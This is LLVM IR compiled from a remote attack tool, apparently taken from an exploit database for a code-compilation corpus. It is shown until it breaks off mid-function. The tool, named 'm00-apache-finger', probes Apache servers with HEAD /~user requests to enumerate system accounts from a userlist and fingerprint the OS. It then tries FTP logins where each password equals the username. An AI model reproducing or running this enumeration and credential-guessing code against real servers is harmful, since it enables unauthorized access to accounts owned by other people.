; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_132.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_132.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_HTTP_PORT = common dso_local global i32 0, align 4
@DEFAULT_FTP_PORT = common dso_local global i32 0, align 4
@__const.main.c200 = private unnamed_addr constant [5 x i8] c" 200 ", align 1
@__const.main.c403 = private unnamed_addr constant [14 x i8] c"403 Forbidden\00", align 1
@__const.main.c404 = private unnamed_addr constant [14 x i8] c"404 Not Found\00", align 1
@__const.main.signature = private unnamed_addr constant [15 x i8] c"Server: Apache\00", align 1
@.str = private unnamed_addr constant [147 x i8] c"Accept: */*\0D\0AAccept-Language: en-us,en;q=0.5\0D\0AAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\0D\0AUser-Agent: m00-apache-finger\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"t:u:hp:vbl:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[-] unable to open logfile [%s]\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.5 = private unnamed_addr constant [34 x i8] c"[-] unable to open userlist [%s]\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"[*] Checking http server [%s:%i]...\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"HEAD /~root HTTP/1.1\0D\0AHost: %s\0D\0A%s\00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c" Apache => \00", align 1
@.str.9 = private unnamed_addr constant [20 x i8] c" no\0A Vulnerable => \00", align 1
@.str.10 = private unnamed_addr constant [21 x i8] c" yes\0A Vulnerable => \00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"no\0A[-] Exiting...\0A\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"yes\0A\00", align 1
@.str.13 = private unnamed_addr constant [35 x i8] c"HEAD /~toor HTTP/1.1\0D\0AHost: %s\0D\0A%s\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c" OS => \00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"FreeBSD\00", align 1
@.str.16 = private unnamed_addr constant [5 x i8] c"Unix\00", align 1
@.str.17 = private unnamed_addr constant [12 x i8] c"Unix unknow\00", align 1
@.str.18 = private unnamed_addr constant [7 x i8] c"Debian\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"Debian Linux\00", align 1
@.str.20 = private unnamed_addr constant [7 x i8] c"RedHat\00", align 1
@.str.21 = private unnamed_addr constant [13 x i8] c"RedHat Linux\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"mdk\00", align 1
@.str.23 = private unnamed_addr constant [15 x i8] c"Mandrake Linux\00", align 1
@.str.24 = private unnamed_addr constant [38 x i8] c"\0A[*] Searching for system accounts...\00", align 1
@.str.25 = private unnamed_addr constant [26 x i8] c"Host: %s\0AFound accounts:\0A\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"\0A %s \09=> \00", align 1
@.str.27 = private unnamed_addr constant [33 x i8] c"HEAD /~%s HTTP/1.1\0D\0AHost: %s\0D\0A%s\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c" yes\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.30 = private unnamed_addr constant [26 x i8] c"\0A[*] Searching complete.\0A\00", align 1
@.str.31 = private unnamed_addr constant [35 x i8] c" %i users checked\0A %i users found\0A\00", align 1
@.str.32 = private unnamed_addr constant [6 x i8] c"FTP:\0A\00", align 1
@.str.33 = private unnamed_addr constant [50 x i8] c"[*] Attempting to log on ftp with login:login...\0A\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c" %s:%s \09=>\00", align 1
@.str.35 = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"PASS %s\0A\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c" yes\0A\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"%s:%s\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c" no\0A\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"[*] Complete.\0A\00", align 1
@.str.42 = private unnamed_addr constant [24 x i8] c" %i ftp accounts found\0A\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca [32 x i8], align 16
  %12 = alloca [32 x i8], align 16
  %13 = alloca [200 x i8], align 16
  %14 = alloca [1000 x i8], align 16
  %15 = alloca i8, align 1
  %16 = alloca [48 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca [5 x i8], align 1
  %26 = alloca [14 x i8], align 1
  %27 = alloca [14 x i8], align 1
  %28 = alloca [15 x i8], align 1
  %29 = alloca i8*, align 8
  %30 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %8, align 8
  store i8* null, i8** %9, align 8
  store i8* null, i8** %10, align 8
  store i32 0, i32* %21, align 4
  store i32 0, i32* %22, align 4
  %31 = load i32, i32* @DEFAULT_HTTP_PORT, align 4
  store i32 %31, i32* %23, align 4
  %32 = load i32, i32* @DEFAULT_FTP_PORT, align 4
  store i32 %32, i32* %24, align 4
  %33 = bitcast [5 x i8]* %25 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %33, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.c200, i32 0, i32 0), i64 5, i1 false)
  %34 = bitcast [14 x i8]* %26 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %34, i8* align 1 getelementptr inbounds ([14 x i8], [14 x i8]* @__const.main.c403, i32 0, i32 0), i64 14, i1 false)
  %35 = bitcast [14 x i8]* %27 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %35, i8* align 1 getelementptr inbounds ([14 x i8], [14 x i8]* @__const.main.c404, i32 0, i32 0), i64 14, i1 false)
  %36 = bitcast [15 x i8]* %28 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 getelementptr inbounds ([15 x i8], [15 x i8]* @__const.main.signature, i32 0, i32 0), i64 15, i1 false)
  store i8* getelementptr inbounds ([147 x i8], [147 x i8]* @.str, i64 0, i64 0), i8** %29, align 8
  %37 = call i32 (...) @m00()
  %38 = load i32, i32* %4, align 4
  %39 = icmp slt i32 %38, 2
  br i1 %39, label %40, label %45

40:                                               ; preds = %2
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @usage(i8* %43)
  br label %45

45:                                               ; preds = %40, %2
  br label %46

46:                                               ; preds = %78, %45
  %47 = load i32, i32* %4, align 4
  %48 = load i8**, i8*** %5, align 8
  %49 = call signext i8 @getopt(i32 %47, i8** %48, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  store i8 %49, i8* %15, align 1
  %50 = sext i8 %49 to i32
  %51 = load i8, i8* @EOF, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp ne i32 %50, %52
  br i1 %53, label %54, label %79

54:                                               ; preds = %46
  %55 = load i8, i8* %15, align 1
  %56 = sext i8 %55 to i32
  switch i32 %56, label %73 [
    i32 116, label %57
    i32 117, label %59
    i32 112, label %61
    i32 108, label %64
    i32 98, label %66
    i32 118, label %67
    i32 104, label %68
  ]

57:                                               ; preds = %54
  %58 = load i8*, i8** @optarg, align 8
  store i8* %58, i8** %10, align 8
  br label %78

59:                                               ; preds = %54
  %60 = load i8*, i8** @optarg, align 8
  store i8* %60, i8** %8, align 8
  br label %78

61:                                               ; preds = %54
  %62 = load i8*, i8** @optarg, align 8
  %63 = call i32 @atoi(i8* %62)
  store i32 %63, i32* %23, align 4
  br label %78

64:                                               ; preds = %54
  %65 = load i8*, i8** @optarg, align 8
  store i8* %65, i8** %9, align 8
  br label %78

66:                                               ; preds = %54
  store i32 1, i32* %22, align 4
  br label %78

67:                                               ; preds = %54
  store i32 1, i32* %21, align 4
  br label %78

68:                                               ; preds = %54
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @usage(i8* %71)
  store i32 1, i32* %3, align 4
  br label %445

73:                                               ; preds = %54
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 0
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @usage(i8* %76)
  store i32 1, i32* %3, align 4
  br label %445

78:                                               ; preds = %67, %66, %64, %61, %59, %57
  br label %46

79:                                               ; preds = %46
  %80 = load i8*, i8** %10, align 8
  %81 = icmp eq i8* %80, null
  br i1 %81, label %82, label %87

82:                                               ; preds = %79
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @usage(i8* %85)
  br label %87

87:                                               ; preds = %82, %79
  %88 = load i8*, i8** %8, align 8
  %89 = icmp eq i8* %88, null
  br i1 %89, label %90, label %95

90:                                               ; preds = %87
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 0
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @usage(i8* %93)
  br label %95

95:                                               ; preds = %90, %87
  %96 = load i8*, i8** %9, align 8
  %97 = icmp ne i8* %96, null
  br i1 %97, label %98, label %106

98:                                               ; preds = %95
  %99 = load i8*, i8** %9, align 8
  %100 = call i32* @fopen(i8* %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %100, i32** %7, align 8
  %101 = icmp eq i32* %100, null
  br i1 %101, label %102, label %106

102:                                              ; preds = %98
  %103 = load i8*, i8** %9, align 8
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i8* %103)
  %105 = call i32 @exit(i32 0) #4
  unreachable

106:                                              ; preds = %98, %95
  %107 = load i8*, i8** %8, align 8
  %108 = call i32* @fopen(i8* %107, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %108, i32** %6, align 8
  %109 = icmp eq i32* %108, null
  br i1 %109, label %110, label %114

110:                                              ; preds = %106
  %111 = load i8*, i8** %8, align 8
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0), i8* %111)
  %113 = call i32 @exit(i32 0) #4
  unreachable

114:                                              ; preds = %106
  %115 = call i64 @malloc(i32 1638)
  %116 = inttoptr i64 %115 to i8**
  store i8** %116, i8*** %30, align 8
  %117 = load i8*, i8** %10, align 8
  %118 = load i32, i32* %23, align 4
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0), i8* %117, i32 %118)
  %120 = load i8*, i8** %10, align 8
  %121 = load i32, i32* %23, align 4
  %122 = call i32 @conn(i8* %120, i32 %121)
  store i32 %122, i32* %18, align 4
  %123 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %124 = load i8*, i8** %10, align 8
  %125 = load i8*, i8** %29, align 8
  %126 = call i32 (i8*, i8*, ...) @sprintf(i8* %123, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0), i8* %124, i8* %125)
  %127 = load i32, i32* %18, align 4
  %128 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %129 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %130 = call i32 @strlen(i8* %129)
  %131 = call i32 @write(i32 %127, i8* %128, i32 %130)
  %132 = load i32, i32* %18, align 4
  %133 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %134 = call i32 @recv(i32 %132, i8* %133, i32 1000, i32 0)
  %135 = load i32, i32* %21, align 4
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %137, label %140

137:                                              ; preds = %114
  %138 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %139 = call i32 @verbose(i8* %138)
  br label %140

140:                                              ; preds = %137, %114
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0))
  %142 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %143 = getelementptr inbounds [15 x i8], [15 x i8]* %28, i64 0, i64 0
  %144 = call i64 @strstr(i8* %142, i8* %143)
  %145 = icmp ne i64 %144, 0
  br i1 %145, label %148, label %146

146:                                              ; preds = %140
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0))
  br label %150

148:                                              ; preds = %140
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0))
  br label %150

150:                                              ; preds = %148, %146
  %151 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %152 = getelementptr inbounds [14 x i8], [14 x i8]* %26, i64 0, i64 0
  %153 = call i64 @strstr(i8* %151, i8* %152)
  %154 = icmp ne i64 %153, 0
  br i1 %154, label %158, label %155

155:                                              ; preds = %150
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0))
  %157 = call i32 @exit(i32 0) #4
  unreachable

158:                                              ; preds = %150
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  br label %160

160:                                              ; preds = %158
  %161 = load i32, i32* %18, align 4
  %162 = call i32 @close(i32 %161)
  %163 = load i8*, i8** %10, align 8
  %164 = load i32, i32* %23, align 4
  %165 = call i32 @conn(i8* %163, i32 %164)
  store i32 %165, i32* %18, align 4
  %166 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %167 = load i8*, i8** %10, align 8
  %168 = load i8*, i8** %29, align 8
  %169 = call i32 (i8*, i8*, ...) @sprintf(i8* %166, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.13, i64 0, i64 0), i8* %167, i8* %168)
  %170 = load i32, i32* %18, align 4
  %171 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %172 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %173 = call i32 @strlen(i8* %172)
  %174 = call i32 @write(i32 %170, i8* %171, i32 %173)
  %175 = load i32, i32* %18, align 4
  %176 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %177 = call i32 @recv(i32 %175, i8* %176, i32 1000, i32 0)
  %178 = load i32, i32* %21, align 4
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %183

180:                                              ; preds = %160
  %181 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %182 = call i32 @verbose(i8* %181)
  br label %183

183:                                              ; preds = %180, %160
  %184 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %185 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %186 = getelementptr inbounds [14 x i8], [14 x i8]* %26, i64 0, i64 0
  %187 = call i64 @strstr(i8* %185, i8* %186)
  %188 = icmp ne i64 %187, 0
  br i1 %188, label %189, label %191

189:                                              ; preds = %183
  %190 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0))
  br label %216

191:                                              ; preds = %183
  %192 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %193 = call i64 @strstr(i8* %192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i64 0, i64 0))
  %194 = icmp ne i64 %193, 0
  br i1 %194, label %195, label %197

195:                                              ; preds = %191
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.17, i64 0, i64 0))
  br label %197

197:                                              ; preds = %195, %191
  %198 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %199 = call i64 @strstr(i8* %198, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.18, i64 0, i64 0))
  %200 = icmp ne i64 %199, 0
  br i1 %200, label %201, label %203

201:                                              ; preds = %197
  %202 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i64 0, i64 0))
  br label %203

203:                                              ; preds = %201, %197
  %204 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %205 = call i64 @strstr(i8* %204, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.20, i64 0, i64 0))
  %206 = icmp ne i64 %205, 0
  br i1 %206, label %207, label %209

207:                                              ; preds = %203
  %208 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.21, i64 0, i64 0))
  br label %209

209:                                              ; preds = %207, %203
  %210 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %211 = call i64 @strstr(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.22, i64 0, i64 0))
  %212 = icmp ne i64 %211, 0
  br i1 %212, label %213, label %215

213:                                              ; preds = %209
  %214 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.23, i64 0, i64 0))
  br label %215

215:                                              ; preds = %213, %209
  br label %216

216:                                              ; preds = %215, %189
  %217 = load i32, i32* %18, align 4
  %218 = call i32 @close(i32 %217)
  %219 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.24, i64 0, i64 0))
  %220 = load i8*, i8** %9, align 8
  %221 = icmp ne i8* %220, null
  br i1 %221, label %222, label %229

222:                                              ; preds = %216
  %223 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %224 = load i8*, i8** %10, align 8
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %223, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.25, i64 0, i64 0), i8* %224)
  %226 = load i32*, i32** %7, align 8
  %227 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %228 = call i32 @fprintf(i32* %226, i8* %227)
  br label %229

229:                                              ; preds = %222, %216
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  br label %230

230:                                              ; preds = %229, %325
  %231 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %232 = load i32*, i32** %6, align 8
  %233 = call i32 @fgets(i8* %231, i32 32, i32* %232)
  %234 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %235 = load i8, i8* %234, align 16
  %236 = sext i8 %235 to i32
  %237 = icmp eq i32 %236, 10
  br i1 %237, label %243, label %238

238:                                              ; preds = %230
  %239 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %240 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %241 = call i64 @strstr(i8* %239, i8* %240)
  %242 = icmp ne i64 %241, 0
  br i1 %242, label %243, label %244

243:                                              ; preds = %238, %230
  br label %328

244:                                              ; preds = %238
  %245 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %246 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %247 = call i32 @strcpy(i8* %245, i8* %246)
  %248 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %249 = call i32 @strlen(i8* %248)
  %250 = sub nsw i32 %249, 1
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 %251
  store i8 0, i8* %252, align 1
  %253 = load i32, i32* %19, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %19, align 4
  %255 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %256 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i64 0, i64 0), i8* %255)
  %257 = load i8*, i8** %10, align 8
  %258 = load i32, i32* %23, align 4
  %259 = call i32 @conn(i8* %257, i32 %258)
  store i32 %259, i32* %18, align 4
  %260 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %261 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %262 = load i8*, i8** %10, align 8
  %263 = load i8*, i8** %29, align 8
  %264 = call i32 (i8*, i8*, ...) @sprintf(i8* %260, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.27, i64 0, i64 0), i8* %261, i8* %262, i8* %263)
  %265 = load i32, i32* %18, align 4
  %266 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %267 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %268 = call i32 @strlen(i8* %267)
  %269 = call i32 @write(i32 %265, i8* %266, i32 %268)
  %270 = load i32, i32* %18, align 4
  %271 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %272 = call i32 @recv(i32 %270, i8* %271, i32 1000, i32 0)
  %273 = load i32, i32* %21, align 4
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %275, label %278

275:                                              ; preds = %244
  %276 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %277 = call i32 @verbose(i8* %276)
  br label %278

278:                                              ; preds = %275, %244
  %279 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %280 = getelementptr inbounds [14 x i8], [14 x i8]* %27, i64 0, i64 0
  %281 = call i64 @strstr(i8* %279, i8* %280)
  %282 = icmp ne i64 %281, 0
  br i1 %282, label %325, label %283

283:                                              ; preds = %278
  %284 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %285 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i8* %284)
  %286 = load i8*, i8** %9, align 8
  %287 = icmp ne i8* %286, null
  br i1 %287, label %288, label %295

288:                                              ; preds = %283
  %289 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %290 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %291 = call i32 (i8*, i8*, ...) @sprintf(i8* %289, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0), i8* %290)
  %292 = load i32*, i32** %7, align 8
  %293 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %294 = call i32 @fprintf(i32* %292, i8* %293)
  br label %295

295:                                              ; preds = %288, %283
  %296 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %297 = call i32 @strlen(i8* %296)
  %298 = call i64 @malloc(i32 %297)
  %299 = inttoptr i64 %298 to i8*
  %300 = load i8**, i8*** %30, align 8
  %301 = load i32, i32* %20, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds i8*, i8** %300, i64 %302
  store i8* %299, i8** %303, align 8
  %304 = load i8**, i8*** %30, align 8
  %305 = load i32, i32* %20, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i8*, i8** %304, i64 %306
  %308 = load i8*, i8** %307, align 8
  %309 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %310 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %311 = call i32 @strlen(i8* %310)
  %312 = call i32 @memcpy(i8* %308, i8* %309, i32 %311)
  %313 = load i8**, i8*** %30, align 8
  %314 = load i32, i32* %20, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i8*, i8** %313, i64 %315
  %317 = load i8*, i8** %316, align 8
  %318 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %319 = call i32 @strlen(i8* %318)
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds i8, i8* %317, i64 %320
  %322 = call i32 @memset(i8* %321, i32 0, i32 1)
  %323 = load i32, i32* %20, align 4
  %324 = add nsw i32 %323, 1
  store i32 %324, i32* %20, align 4
  br label %325

325:                                              ; preds = %295, %278
  %326 = load i32, i32* %18, align 4
  %327 = call i32 @close(i32 %326)
  br label %230

328:                                              ; preds = %243
  %329 = load i32*, i32** %6, align 8
  %330 = call i32 @fclose(i32* %329)
  %331 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.30, i64 0, i64 0))
  %332 = load i32, i32* %19, align 4
  %333 = load i32, i32* %20, align 4
  %334 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i32 %332, i32 %333)
  %335 = load i32, i32* %22, align 4
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %337, label %437

337:                                              ; preds = %328
  %338 = load i32, i32* %20, align 4
  %339 = icmp sgt i32 %338, 0
  br i1 %339, label %340, label %437

340:                                              ; preds = %337
  store i32 0, i32* %19, align 4
  store i32 0, i32* %17, align 4
  %341 = load i8*, i8** %9, align 8
  %342 = icmp ne i8* %341, null
  br i1 %342, label %343, label %349

343:                                              ; preds = %340
  %344 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %345 = call i32 (i8*, i8*, ...) @sprintf(i8* %344, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.32, i64 0, i64 0))
  %346 = load i32*, i32** %7, align 8
  %347 = getelementptr inbounds [48 x i8], [48 x i8]* %16, i64 0, i64 0
  %348 = call i32 @fprintf(i32* %346, i8* %347)
  br label %349

349:                                              ; preds = %343, %340
  %350 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.33, i64 0, i64 0))
  br label %351

351:                                              ; preds = %428, %349
  %352 = load i32, i32* %19, align 4
  %353 = load i32, i32* %20, align 4
  %354 = icmp ne i32 %352, %353
  br i1 %354, label %355, label %433

355:                                              ; preds = %351
  %356 = load i8**, i8*** %30, align 8
  %357 = load i32, i32* %19, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds i8*, i8** %356, i64 %358
  %360 = load i8*, i8** %359, align 8
  %361 = load i8**, i8*** %30, align 8
  %362 = load i32, i32* %19, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds i8*, i8** %361, i64 %363
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i64 0, i64 0), i8* %360, i8* %365)
  %367 = load i8*, i8** %10, align 8
  %368 = load i32, i32* %24, align 4
  %369 = call i32 @conn(i8* %367, i32 %368)
  store i32 %369, i32* %18, align 4
  %370 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %371 = load i8**, i8*** %30, align 8
  %372 = load i32, i32* %19, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds i8*, i8** %371, i64 %373
  %375 = load i8*, i8** %374, align 8
  %376 = call i32 (i8*, i8*, ...) @sprintf(i8* %370, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i64 0, i64 0), i8* %375)
  %377 = load i32, i32* %18, align 4
  %378 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %379 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %380 = call i32 @strlen(i8* %379)
  %381 = call i32 @write(i32 %377, i8* %378, i32 %380)
  %382 = load i32, i32* %18, align 4
  %383 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %384 = call i32 @recv(i32 %382, i8* %383, i32 1000, i32 0)
  %385 = getelementptr inbounds [200 x i8], [200 x i8]* %13, i64 0, i64 0
  %386 = load i8**, i8*** %30, align 8
  %387 = load i32, i32* %19, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds i8*, i8** %386, i64 %388
  %390 = load i8*, i8** %389, align 8
